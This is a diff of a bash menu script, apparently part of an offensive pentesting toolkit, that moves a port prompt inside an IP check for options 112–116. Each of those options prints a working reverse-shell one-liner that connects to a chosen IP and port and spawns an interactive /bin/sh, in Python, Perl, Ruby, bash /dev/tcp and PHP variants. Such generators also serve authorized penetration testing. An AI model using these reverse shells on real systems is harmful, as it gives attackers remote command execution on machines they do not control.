@@ -1539,9 +1539,9 @@ while true; do
 	;;
 	"112")
 		read -p "Digit your IPv4 address: " MIP
-		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
+			read -p "Digit your port: " MPORT
 			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"""$MIP""\",""$MPORT""));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
@@ -1550,9 +1550,9 @@ while true; do
 	;;
 	"113")
 		read -p "Digit your IPv4 address: " MIP
-		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
+			read -p "Digit your port: " MPORT
 			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "perl -e 'use Socket;$i=\"""$MIP""\";$p=""$MPORT"";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
@@ -1561,9 +1561,9 @@ while true; do
 	;;
 	"114")
 		read -p "Digit your IPv4 address: " MIP
-		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
+			read -p "Digit your port: " MPORT
 			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "ruby -rsocket -e'f=TCPSocket.open(\"""$MIP""\",""$MPORT"").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
@@ -1572,9 +1572,9 @@ while true; do
 	;;
 	"115")
 		read -p "Digit your IPv4 address: " MIP
-		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
+			read -p "Digit your port: " MPORT
 			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "bash -i >& /dev/tcp/""$MIP""/""$MPORT"" 0>&1"
@@ -1584,9 +1584,9 @@ while true; do
 	;;
 	"116")
 		read -p "Digit your IPv4 address: " MIP
-		read -p "Digit your port: " MPORT
 		if [[ "$MIP" != "" ]];
 		then
+			read -p "Digit your port: " MPORT
 			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
 				echo "php -r '\$sock=fsockopen(\""$MIP"\",""$MPORT"");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
